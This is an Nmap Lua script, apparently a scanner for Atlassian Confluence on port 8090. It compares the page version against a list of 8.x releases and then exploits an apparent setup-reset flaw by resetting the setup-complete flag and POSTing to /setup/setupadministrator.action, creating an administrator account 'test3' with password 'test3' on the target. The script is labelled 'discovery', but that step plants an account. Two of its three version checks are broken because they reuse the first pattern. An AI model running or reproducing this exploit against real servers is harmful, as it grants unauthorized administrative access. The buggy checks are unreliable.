local http = require "http"
local shortport = require "shortport"
local pcre = require "pcre"
local json = require "json"

description = [[
    cool script
]]
author = "Dimas"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery"}


portrule = shortport.portnumber({8090}, "tcp", {"open", "open|filtered"})


local vuln_versions = {
    "8.0.0", "8.0.1", "8.0.2", "8.0.3", "8.0.4", "8.1.0", "8.1.1",
    "8.1.3", "8.1.4", "8.2.0", "8.2.1", "8.2.2", "8.2.3", "8.3.0",
    "8.3.1", "8.3.2", "8.4.0", "8.4.1", "8.4.2", "8.5.0", "8.5.1",
}

local function is_version_vulnerable(version)
    for _, v in ipairs(vuln_versions) do
        if v == version then
            return true
        end
    end
    return false
end

local function extract_reg_value(str, expression)
    local regex = pcre.new(expression, 0, "C")
    local start_pos, end_pos, substrings = regex:match(str)
    if start_pos then
        return substrings[1]
    else
        return nil
    end
end

local function bool_to_sign(value)
    if value then return "+"
    else return "-"
    end
end

local function version_analyze(host, port)
    local result = http.get(host, port, "/")

    if not result.body then
        print("empty body, skip")
        return
    end

    local version_exp = "(\\d+\\.\\d+\\.\\d+)"

    local exp_1 = '<meta name="ajs-version-number" content="' .. version_exp .. '">'
    local exp_2 = "<span id='footer-build-information'>" .. version_exp .. "</span>"
    local exp_3 = '<li class="print-only">Printed by Atlassian Confluence ' .. version_exp .. '</li>'

    local version_1 = extract_reg_value(result.body, exp_1)
    local version_2 = extract_reg_value(result.body, exp_1)
    local version_3 = extract_reg_value(result.body, exp_1)

    local is_version_1_vuln = is_version_vulnerable(version_1)
    local is_version_2_vuln = is_version_vulnerable(version_2)
    local is_version_3_vuln = is_version_vulnerable(version_3)

    print("")
    print("")
    print("--- 1.Version check ---")
    print("")

    if is_version_1_vuln or is_version_2_vuln or is_version_3_vuln then
        print('Host seems vulnerable!')
    else
        print('patched version :(')
    end
    print("")
    print(version_1, bool_to_sign(is_version_1_vuln), exp_1)
    print(version_2, bool_to_sign(is_version_2_vuln), exp_2)
    print(version_3, bool_to_sign(is_version_3_vuln), exp_3)
    print("")
end

local function vuln_route_check(host, port)
    local data = {
        username = "test3",
        fullName= "test3",
        email= "test3@localhost",
        password= 'test3',
        confirm= 'test3',
        ['setup-next-button']= "Next"
    }

    local result = http.get(host, port, "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false")

    options = {}
    header = {}
    header['X-Atlassian-Token'] = 'no-check'
    header['Content-Type'] = 'application/json'
    options['header'] = header
    options['content'] = json.generate(data)

    local result = http.post(host, port, "/setup/setupadministrator.action",  options)

    print("--- 2.Route check -----")
    print("")

    if not result.body then
        print("empty body, skip")
        return
    end

    local check_1 = string.find(result.body, "Setup Successful")
    local check_2 = string.find(result.body, "A user with this username already exists")
    local check_3 = string.find(result.body, "Setup is already complete")

    if check_1 or check_2 then
        print('Host seems vulnerable!')
    elseif check_3 then
        print('patched version :(')
    else
        print('dont know')
    end
    print("")

    print(bool_to_sign(check_1), "Setup Successful")
    print(bool_to_sign(check_2), "user with this username already exists")
    print("")
    print(bool_to_sign(check_3), "Setup is already complete (patched version response)")

    print("")
    print("-----------------------")
    print("")
end

action = function(host, port)
    version_analyze(host, port)
    vuln_route_check(host, port)
end
